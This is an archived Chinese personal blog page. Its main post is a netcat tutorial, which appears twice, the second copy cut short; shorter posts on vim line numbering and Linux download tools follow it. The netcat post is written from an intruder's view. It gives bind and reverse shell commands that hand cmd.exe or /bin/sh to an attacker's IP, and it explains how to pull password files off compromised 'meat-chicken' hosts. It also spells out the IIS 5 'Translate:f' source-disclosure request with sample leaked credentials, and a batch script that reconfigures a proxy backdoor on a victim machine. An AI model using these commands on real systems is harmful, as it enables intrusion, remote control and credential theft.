<!doctype html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Hexo, NexT" />








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />






<meta name="description" content="这里是外宅，备份用的">
<meta property="og:type" content="website">
<meta property="og:title" content="九王爷">
<meta property="og:url" content="http://yoursite.com/page/17/index.html">
<meta property="og:site_name" content="九王爷">
<meta property="og:description" content="这里是外宅，备份用的">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="九王爷">
<meta name="twitter:description" content="这里是外宅，备份用的">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/17/"/>





  <title> 九王爷 </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  














  
  
    
  

  <div class="container one-collumn sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">九王爷</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">九王爷的府邸</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2008/03/24/netcat教程/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="九王爷">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="九王爷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2008/03/24/netcat教程/" itemprop="url">
                  netcat教程
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2008-03-24T13:00:00+08:00">
                2008-03-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Other/" itemprop="url" rel="index">
                    <span itemprop="name">Other</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>netcat教程</p>
<hr>
<p>在网络工具中有“瑞士军刀”美誉的NetCat， 在我们用了N年了至今仍是爱不释手。因为它短小精悍（这个用在它身上很适合，现在有人已经将其修改成大约10K左右，而且功能不减少）。现在就我的一些使用心得和一些帮助文档中，做一些介绍与大家共勉。<br>1、 了解NC的用法<br>命令：nc –h<br>技巧：win98用户可以在autoexec.bat加入path=nc的路径，win2000用户在环境变量中加入path中，linux含有这个命令（redhat）<br>1、基本使用<br>想要连接到某处: nc [-options] hostname port[s] [ports] …<br>绑定端口等待连接: nc -l -p port [-options] [hostname] [port]<br>参数:<br>-e prog 程序重定向，一旦连接，就执行 [危险!!]<br>-g gateway source-routing hop point[s], up to 8<br>-G num source-routing pointer: 4, 8, 12, …<br>-h 帮助信息<br>-i secs 延时的间隔<br>-l 监听模式，用于入站连接<br>-n 指定数字的IP地址，不能用hostname<br>-o file 记录16进制的传输<br>-p port 本地端口号<br>-r 任意指定本地及远程端口<br>-s addr 本地源地址<br>-u UDP模式<br>-v 详细输出——用两个-v可得到更详细的内容<br>-w secs timeout的时间<br>-z 将输入输出关掉——用于扫描时<br>其中端口号可以指定一个或者用lo-hi式的指定范围。<br>例如：扫描端口<br>tcp扫描<br>C:nc&gt;nc -v -z -w2 192.168.0.80 1-140<br>net [192.168.0.80] 140 (?)<br>net [192.168.0.80] 139 (netbios-ssn) open<br>net [192.168.0.80] 138 (?)<br>net [192.168.0.80] 137 (netbios-ns)<br>net [192.168.0.80] 136 (?)<br>net [192.168.0.80] 135 (epmap) open<br>net [192.168.0.80] 81 (?) open<br>net [192.168.0.80] 80 (http) open<br>net [192.168.0.80] 79 (finger)<br>net [192.168.0.80] 25 (smtp) open<br>net [192.168.0.80] 24 (?)<br>net [192.168.0.80] 23 (telnet)<br>net [192.168.0.80] 21 (ftp)<br>udp扫描<br>C:nc&gt;nc -u -v -z -w2 192.168.0.80 1-140<br>net [192.168.0.80] 140 (?) open<br>net [192.168.0.80] 139 (?) open<br>net [192.168.0.80] 138 (netbios-dgm) open<br>net [192.168.0.80] 137 (netbios-ns) open<br>net [192.168.0.80] 54 (?) open<br>net [192.168.0.80] 53 (domain) open<br>net [192.168.0.80] 38 (?) open<br>net [192.168.0.80] 37 (time) open<br>net [192.168.0.80] 7 (echo) open<br>二、高级应用<br>1．Window用法：<br>（1）IE的MIME欺骗<br>www.try2hack..nl(是一个让初学黑客技术的人去做实验的站点)<br>打开这个页面，有<a href="http://www.try2hack.nl/cgi-bin/level7.pl页面（这个网站提供了黑客的8关，过了这8关证明你开始入门了），这个页面告诉我们的浏览器不是" target="_blank" rel="external">http://www.try2hack.nl/cgi-bin/level7.pl页面（这个网站提供了黑客的8关，过了这8关证明你开始入门了），这个页面告诉我们的浏览器不是</a> IE6.72,我们的操作系统不是LIUNX,我们不是从www.microsoft.com/ms.htm重定向链接过去的，有病阿（这是一个题目呀，要慢慢研究），linux有IE6.72? 微软会在它的页面上放<a href="http://www.try2hack.nl/cgi-bin/level7.pl的链接？看看页面的源代码，level7.pl" target="_blank" rel="external">http://www.try2hack.nl/cgi-bin/level7.pl的链接？看看页面的源代码，level7.pl</a> 是在服务器端执行的perl脚本，根本无法看到，还是研究一下IE5和它通信时都告诉了它什么，抓包，我们会发现，我们的IE5告诉对方：我是MSIE 5.0; Windows NT 5.0; .NET CLR 1.0.3705。。。。哈哈，level7.pl这个cgi应该是根据这些信息知道我们不是它要求的客户，嘿嘿，需要欺骗对方才行，用军刀来可以实现，如下做就可以哄对方了：<br>nc www.try2hack.nl 80 [enter]<br>GET /cgi-bin/level7.pl HTTP/1.1 [enter]<br>Accept: image/gif, image/x-xbitmap, application/msword, <em>/</em> [enter]<br>Referer<a href="http://www.microsoft.com/ms.htm" target="_blank" rel="external">http://www.microsoft.com/ms.htm</a> [enter]<br>Accept-Language: zh-cn [enter]<br>Accept-Encoding: gzip, deflate [enter]<br>User-Agent: Mozilla/4.0 (compatible; MSIE 6.72; Linux 8.8.8 i986) [enter]<br>Host: www.try2hack.nl [enter]<br>Connection:<br>Keep-Alive [enter]<br>注意，如果出现HTTP 400时，说明你输入格式有问题，出现httpd 200回应时，就给出结果了：<br>哈哈！赶快去实现一下（实践是成功之母）<br>（2）IIS 5 “Translate:f” 显示代码脆弱点<br>Translate: f脆弱点的机制：发送一个畸形的HTTP GET 请求给服务器方一个可执行脚本或相关文件类型（例如.ASP或者global.asa）。这些文件是用于服务器上运行的，绝不会到客户机上去，而这个请求就会导致IIS将这种文件的内容发送到远端的客户机上，而不是在服务器上运行。这种畸形的HTTP GET请求的关键特性是该请求的末尾有一个特定的头信息Translate:f，并有一个反斜杠””附于URL之后。下面就有这样的一个例子（[CRLF]代表回车字符）<br>注意 GET global.asa 后的反斜杠以及Translate:f头信息。<br>GET /global.asa HTTP/1.0<br>Host:192.168.0.1<br>User-Agent:SensePostData<br>Content-Type:application/x-www-form-urlencoded<br>Translate:f<br>[CRLF]<br>[CRLF]<br>将以上内容保存在一个文本文件中（例如example.txt）<br>然后向一个有这个漏洞的服务器发送<br>c:&gt;type example.txt | nc –nvv 192.168.0.80 80<br>(UNKNOWN) [192.168.0.80] 80 (?) open<br>HTTP/1.1 200 OK<br>Server: Microsoft-IIS/5.0<br>Date: Tue, 03 Dec 2002 08:50:46 GMT<br>Content-Type: application/octet-stream<br>Content-Length: 2790<br>ETag: “0448299fcd6df1:bea”<br>Last-Modified: Wed, 13 Nov 2002 18:50:46 GMT<br>Accept-Ranges: bytes<br>Cache-Control: no-cache</p>
<p>(“ConnectionText”) = “Dsn=ph;UID=myman;Password=mygod)”<br>(“LDAPServer”) = “LADP://ldap.netloafer.com:389”<br>(“LDAPUserID”) = “CN=Admin”<br>(“LDAPPwd”) = “mygod”<br>………</p>
<p>3.1.端口的刺探：<br>nc -vv ip port<br>RIVER [192.168.0.198] 19190 (?) open //显示是否开放open<br>3.2.扫描器<br>nc -vv -w 5 ip port-port port<br>nc -vv -z ip port-port port<br>这样扫描会留下大量的痕迹，系统管理员会额外小心</p>
<p>3.3. 后门<br>victim machine: //受害者的机器<br>nc -l -p port -e cmd.exe //win2000<br>nc -l -p port -e /bin/sh //unix,linux<br>attacker machine: //攻击者的机器.<br>nc ip -p port //连接victim_IP,然后得到一个shell。</p>
<p>3.4.反向连接<br>attacker machine: //一般是sql2.exe,远程溢出,webdavx3.exe攻击.<br>//或者wollf的反向连接.<br>nc -vv -l -p port<br>victim machine:<br>nc -e cmd.exe attacker ip -p port<br>nc -e /bin/sh attacker ip -p port</p>
<p>或者：<br>attacker machine:<br>nc -vv -l -p port1 /<em>用于输入</em>/<br>nc -vv -l -p prot2 /<em>用于显示</em>/<br>victim machine:<br>nc attacker_ip port1 | cmd.exe | nc attacker_ip port2<br>nc attacker_ip port1 | /bin/sh | nc attacker_ip port2</p>
<p>139要加参数-s（nc.exe -L -p 139 -d -e cmd.exe -s 对方机器IP）<br>这样就可以保证nc.exe优先于NETBIOS。</p>
<p>3.5.传送文件：<br>3.5.1 attacker machine &lt;– victim machine //从肉鸡拖密码文件回来.<br>nc -d -l -p port &lt; pathfiledest 　　　 /<em>attacker machine</em>/ 可以shell执行<br>nc -vv attacker_ip port &gt; pathfile.txt /<em>victim machine</em>/ 需要Ctrl+C退出<br>//肉鸡需要gui界面的cmd.exe里面执行(终端登陆,不如安装FTP方便).否则没有办法输入Crl+C.</p>
<p>3.5.2 attacker machine –&gt; victim machine //上传命令文件到肉鸡<br>nc －vv -l -p port &gt; pathfile.txt　　　　　 /<em>victim machine</em>/ 需要Ctrl+C退出<br>nc -d victim_ip port &lt; pathfiledest 　 /<em>attacker machine</em>/ 可以shell执行<br>//这样比较好.我们登陆终端.入侵其他的肉鸡.可以选择shell模式登陆.</p>
<p>结论: 可以传输ascii,bin文件.可以传输程序文件.</p>
<p>问题:连接某个ip后,传送完成后,需要发送Ctrl+C退出nc.exe .<br>或者只有再次连接使用pskill.exe 杀掉进程.但是是否释放传输文件打开的句柄了?</p>
<p>3.6 端口数据抓包.<br>nc -vv -w 2 -o test.txt www.xfocus.net 80 21-15</p>
<p>&lt; 00000058 35 30 30 20 53 79 6e 74 61 78 20 65 72 72 6f 72 # 500 Syntax error<br>&lt; 00000068 2c 20 63 6f 6d 6d 61 6e 64 20 22 22 20 75 6e 72 # , command “” unr<br>&lt; 00000078 65 63 6f 67 6e 69 7a 65 64 2e 0d 0a # ecognized…<br>&lt; 00000084 83 00 00 01 8f # …..</p>
<p>3.7 telnet,自动批处理。 ★★★★★我要重点推荐的东西就是这个.<br>nc victim_ip port &lt; pathfile.cmd 　 /<em>victim machine</em>/ 显示执行过程.<br>nc -vv victim_ip port &lt; pathfile.cmd 　 /<em>victim machine</em>/ 显示执行过程.</p>
<p>nc -d victim_ip port &lt; pathfile.cmd 安静模式.</p>
<p><strong><strong><strong>___</strong></strong></strong>file.cmd<strong><strong><strong><strong><strong><em>__</em></strong></strong></strong></strong></strong><br>password<br>cd %windir%<br>echo []=[%windir%]<br>c:<br>cd<br>md test<br>cd /d %windir%system32<br>net stop sksockserver<br>snake.exe -config port 11111<br>net start sksockserver<br>exit<br><strong><strong><strong>___</strong></strong></strong>file.cmd<strong>END<strong><strong><strong><strong>_</strong></strong></strong></strong></strong></p>
<hr>
<p>在网络工具中有“瑞士军刀”美誉的NetCat， 在我们用了N年了至今仍是爱不释手。因为它短小精悍（这个用在它身上很适合，现在有人已经将其修改成大约10K左右，而且功能不减少）。现在就我的一些使用心得和一些帮助文档中，做一些介绍与大家共勉。<br>1、 了解NC的用法<br>命令：nc –h<br>技巧：win98用户可以在autoexec.bat加入<br>path=nc的路径，win2000用户在环境变量中加入path中，linux含有这个命令（redhat）<br>1、基本使用<br>想要连接到某处: nc [-options] hostname port[s] [ports] …<br>绑定端口等待连接: nc -l -p port [-options] [hostname] [port]<br>参数:<br>-e prog 程序重定向，一旦连接，就执行 [危险!!]<br>-g gateway source-routing hop point[s], up to 8<br>-G num source-routing pointer: 4, 8, 12, …<br>-h 帮助信息<br>-i secs 延时的间隔<br>-l 监听模式，用于入站连接<br>-n 指定数字的IP地址，不能用hostname<br>-o file 记录16进制的传输<br>-p port 本地端口号<br>-r 任意指定本地及远程端口<br>-s addr 本地源地址<br>-u UDP模式<br>-v 详细输出——用两个-v可得到更详细的内容<br>-w secs timeout的时间<br>-z 将输入输出关掉——用于扫描时<br>其中端口号可以指定一个或者用lo-hi式的指定范围。<br>例如：扫描端口<br>tcp扫描<br>C:nc&gt;nc -v -z -w2 192.168.0.80 1-140<br>net [192.168.0.80] 140 (?)<br>net [192.168.0.80] 139 (netbios-ssn) open<br>net [192.168.0.80] 138 (?)<br>net [192.168.0.80] 137 (netbios-ns)<br>net [192.168.0.80] 136 (?)<br>net [192.168.0.80] 135 (epmap) open<br>net [192.168.0.80] 81 (?) open<br>net [192.168.0.80] 80 (http) open<br>net [192.168.0.80] 79 (finger)<br>net [192.168.0.80] 25 (smtp) open<br>net [192.168.0.80] 24 (?)<br>net [192.168.0.80] 23 (telnet)<br>net [192.168.0.80] 21 (ftp)<br>udp扫描<br>C:nc&gt;nc -u -v -z -w2 192.168.0.80 1-140<br>net [192.168.0.80] 140 (?) open<br>net [192.168.0.80] 139 (?) open<br>net [192.168.0.80] 138 (netbios-dgm) open<br>net [192.168.0.80] 137 (netbios-ns) open<br>net [192.168.0.80] 54 (?) open<br>net [192.168.0.80] 53 (domain) open<br>net [192.168.0.80] 38 (?) open<br>net [192.168.0.80] 37 (time) open<br>net [192.168.0.80] 7 (echo) open<br>二、高级应用<br>1．Window用法：<br>（1）IE的MIME欺骗<br>www.try2hack..nl(是一个让初学黑客技术的人去做实验的站点)<br>打开这个页面，有个<a href="http://www.try2hack.nl/cgi-bin/level7.pl页面（这个网站提供了黑客的8关，过了这8关证明你开始入门了），这个页面告诉我们的浏览器不是" target="_blank" rel="external">http://www.try2hack.nl/cgi-bin/level7.pl页面（这个网站提供了黑客的8关，过了这8关证明你开始入门了），这个页面告诉我们的浏览器不是</a> IE6.72,我们的操作系统不是LIUNX,我们不是从www.microsoft.com/ms.htm重定向链接过去的，有病阿（这是一个题目呀，要慢慢研究），linux有IE6.72? 微软会在它的页面上放上<a href="http://www.try2hack.nl/cgi-bin/level7.pl的链接？看看页面的源代码，" target="_blank" rel="external">http://www.try2hack.nl/cgi-bin/level7.pl的链接？看看页面的源代码，</a> level7.pl是在服务器端执行的perl脚本，根本无法看到，还是研究一下IE5和它通信时都告诉了它什么，抓包，我们会发现，我们的IE5告诉对方： 我是MSIE 5.0; Windows NT 5.0; .NET CLR 1.0.3705。。。。哈哈，level7.pl这个cgi应该是根据这些信息知道我们不是它要求的客户，嘿嘿，需要欺骗对方才行，用军刀来可以实现，如下做就可以哄对方了：<br>nc www.try2hack.nl 80 [enter]<br>GET /cgi-bin/level7.pl HTTP/1.1 [enter]<br>Accept: image/gif, image/x-xbitmap, application/msword, <em>/</em> [enter]<br>Referer:<a href="http://www.microsoft.com/ms.htm" target="_blank" rel="external">http://www.microsoft.com/ms.htm</a> [enter]<br>Accept-Language: zh-cn [enter]<br>Accept-Encoding: gzip, deflate [enter]<br>User-Agent: Mozilla/4.0 (compatible; MSIE 6.72; Linux 8.8.8 i986) [enter]<br>Host: www.try2hack.nl [enter]<br>Connection:<br>Keep-Alive [enter]<br>注意，如果出现HTTP 400时，说明你输入格式有问题，出现httpd 200回应时，就给出结果了：<br>哈哈！赶快去实现一下（实践是成功之母）<br>（2）IIS 5 “Translate:f” 显示代码脆弱点<br>Translate:f 脆弱点的机制：发送一个畸形的HTTP GET 请求给服务器方一个可执行脚本或相关文件类型（例如.ASP或者global.asa）。这些文件是用于服务器上运行的，绝不会到客户机上去，而这个请求就会导致IIS将这种文件的内容发送到远端的客户机上，而不是在服务器上运行。这种畸形的HTTP GET请求的关键特性是该请求的末尾有一个特定的头信息Translate:f，并有一个反斜杠””附于URL之后。下面就有这样的一个例子（[CRLF]代表回车字符）<br>注意 GET global.asa 后的反斜杠以及Translate:f头信息。<br>GET /global.asa HTTP/1.0<br>Host:192.168.0.1<br>User-Agent:SensePostData<br>Content-Type:application/x-www-form-urlencoded<br>Translate:f<br>[CRLF]<br>[CRLF]<br>将以上内容保存在一个文本文件中（例如example.txt）<br>然后向一个有这个漏洞的服务器发送<br>c:&gt;type example.txt | nc –nvv 192.168.0.80 80<br>(UNKNOWN) [192.168.0.80] 80 (?) open<br>HTTP/1.1 200 OK<br>Server: Microsoft-IIS/5.0<br>Date: Tue, 03 Dec 2002 08:50:46 GMT<br>Content-Type: application/octet-stream<br>Content-Length: 2790<br>ETag: “0448299fcd6df1:bea”<br>Last-Modified: Wed, 13 Nov 2002 18:50:46 GMT<br>Accept-Ranges: bytes<br>Cache-Control: no-cache</p>
<p>(“ConnectionText”) = “Dsn=ph;UID=myman;Password=mygod)”<br>(“LDAPServer”) = “LADP://ldap.netloafer.com:389”<br>(“LDAPUserID”) = “CN=Admin”<br>(“LDAPPwd”) = “mygod”</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2008/03/24/vim下添加行号的种种方法/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="九王爷">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="九王爷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2008/03/24/vim下添加行号的种种方法/" itemprop="url">
                  vim下添加行号的种种方法
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2008-03-24T12:59:00+08:00">
                2008-03-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Other/" itemprop="url" rel="index">
                    <span itemprop="name">Other</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>总结一下,经常使用的增加行号的方法:<br>1. 调用外面的程序<br>    A) :%!cat -n<br>    B) :%!nl<br>    C) :%!awk ‘{print NR,$0}’<br>2. 利用VIM自身来增加行号<br>    A) :g@^@exec “s@^@”.strpart(line(“.”).”     “, 0, 4)<br>    B) 利用宏 (这个看起来比较复杂一些)<br>       1)^VGI             —-&gt; 将文本右移6个空格<br>       2)i1<esc>          —-&gt; 在第一行行首输入1<br>       3)gay3lj0P0^A0     —-&gt; 录制宏<br>       4)300@a            —-&gt; 添加1到300行行号(当然也可以是350行,400行….)</esc></p>
<p>1 类方法适合*nix操作系统使用, 而2类方法适合任何操作系统</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2008/03/24/linux命令行下载工具/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="九王爷">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="九王爷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2008/03/24/linux命令行下载工具/" itemprop="url">
                  linux命令行下载工具
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2008-03-24T12:58:00+08:00">
                2008-03-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux/" itemprop="url" rel="index">
                    <span itemprop="name">Linux</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>命令行下载工具</p>
<p>   对于喜欢命令行操作及追求高效率、高速度下载的朋友，推荐使用命令行下载工具。命令行工具不但使用方便，而且大多具有很高的下载速度及下载效率，尤其适合于大批量下载文件。下面就为大家详细介绍一下这些工具。</p>
<pre><code>Wget     Wget是一个十分常用命令行下载工具，多数Linux发行版本都默认包含这个工具。如果没有安装可在http://www.gnu.org/software/wget/wget.html下载最新版本，并使用如下命令编译安装：
#tar zxvf wget-1.9.1.tar.gz
#cd wget-1.9.1 #./configure
#make #make install
</code></pre><p>它的用法很简单，Wget使用格式如下： #wget [选项] [下载地址] 1.Wget常用参数 ◆-b：后台下载，Wget默认的是把文件下载到当前目录。 ◆-O：将文件下载到指定的目录中。 ◆-P：保存文件之前先创建指定名称的目录。 ◆-t：尝试连接次数，当Wget无法与服务器建立连接时，尝试连接多少次。 ◆-c：断点续传，如果下载中断，那么连接恢复时会从上次断点开始下载。     除了上述常用功能，Wget还支持HTTP和FTP代理功能，编辑其配置文件“/etc/wgetrc”即可。具体方法是使用VI编辑器打开上述文件，将 “http_proxy”和“ftp_proxoy”前的#去掉，然后在这两项后输入相应的代理服务器的地址，保存退出即可。此外，Wget还可下载整个网站，如下载<a href="http://man.chinaunix.net整个Man手册中心。只需输入如下命令即可：" target="_blank" rel="external">http://man.chinaunix.net整个Man手册中心。只需输入如下命令即可：</a> #wget -r -p -np -k <a href="http://man.chinaunix.net" target="_blank" rel="external">http://man.chinaunix.net</a> 其中-r参数是指使用递归下载，-p是指下载所有显示完整网页所以需要的文件，如图片等，-np是指不搜索上层目录，-k则是指将绝对链接转换为相对链接。</p>
<pre><code> Prozilla     Prozilla也是一个十分流行的命令行下载工具，支持多线程下载和断点续传功能。可到http://prozilla.genesys.ro/下载最新的1.3.7.4安装包，下载安装包后使用如下命令进行安装：
#tar zxvf prozilla-1.3.7.4.tar.gz
#cd prozilla-1.3.7.4
#./configure #make
#make install
</code></pre><p>Prozilla命令格式如下： #proz [参数] [下载地址] 常用的选项有： ◆-k=n ：设置n个线程下载。不加此参数指定线程数，Prozilla默认为4线程下载。 ◆-P, –directory-prefix=DIR：指定将下载的文件保存在DIR/目录。 ◆-r, –resume：继续下载未完成的文件。如果要指定线程数下载可用如下命令： #proz -k=5 <a href="http://64.12.204.21/pub/mozilla.org/firefox/releases/1.0/linux-i686/zh-CN/firefox-1.0.installer.tar.gz" target="_blank" rel="external">http://64.12.204.21/pub/mozilla.org/firefox/releases/1.0/linux-i686/zh-CN/firefox-1.0.installer.tar.gz</a> 这样便以5线程进行文件的下载，并将文件保存到当前目录。和Wget一样，Prozilla也提供了续传功能，下载中断后，重新输入上述命令，就会出现提示续传，按R键就可继续下载了。</p>
<pre><code> MyGet     MyGet目标设计成一个可扩展的，拥有丰富界面的多线程下载工具，它支持HTTP、FTP、HTTPS、MMS、RTSP等协议。在http://myget.sourceforge.net/release/myget-0.1.0.tar.bz2下载其最新版本0.1.0，下载后使用如下命令安装：
 #tar jxvf myget-0.1.0.tar.bz2
#cd myget-0.1.0 #./configure
#make
#make install
</code></pre><p>MyGet命令格式如下： #mytget [选项] [下载地址] 常用的选项： ◆-d [目录]：指定下载到的文件在本地存放的位置，默认当前目录。 ◆-f [文件]：指定下载文件名称。 ◆-h：帮助选项。 ◆-n [线程数]：下载线程数量，默认为4个。 ◆-x [代理服务器地址]：设置代理服务器地址，如“-x <a href="http://user:password@host:port”。" target="_blank" rel="external">http://user:password@host:port”。</a> MyGet常用的形式如下： #mytget －d /root/ -n 10 <a href="http://lumaqq.linuxsir.org/download/patch/lumaqq_2004t_patch_2005.07.21.00.00.zip" target="_blank" rel="external">http://lumaqq.linuxsir.org/download/patch/lumaqq_2004t_patch_2005.07.21.00.00.zip</a></p>
<pre><code>Linuxdown     Linuxdown是一个命令行多线程下载工具，最多可支持30线程的下载。在https://gro.clinux.org/frs/download.php/1015/linuxdown-1.0.0.tar.gz下载最新的1.1.0版本。然后使用如下命令进行编译安装：
#tar zxvf linuxdown-1.1.0.tar.gz
#cd dandelion/
#make
#make install
</code></pre><p>linuxdown格式为： #linuxdown [下载地址] [选项] [线程数]     需要注意的是下载地址和选项都需要西文引号括起来，线程数不可超过30个。一个典型的下载如下： #linuxdown “<a href="http://lumaqq.linuxsir.org/download/patch/lumaqq_2004t_patch_2005.07.21.00.00.zip" target="_blank" rel="external">http://lumaqq.linuxsir.org/download/patch/lumaqq_2004t_patch_2005.07.21.00.00.zip</a>“ 30</p>
<pre><code>Curl     Curl也是Linux下不错的命令行下载工具，小巧、高速，唯一的缺点是不支持多线程下载。在http://curl.haxx.se/download/curl-7.14.0.tar.gz下载最新版本。下载后便可使用如下命令编译安装：         #tar zxvf curl-7.14.0.tar.gz
#cd curl-7.14.0/
#./configure
#make
#make test
#make install
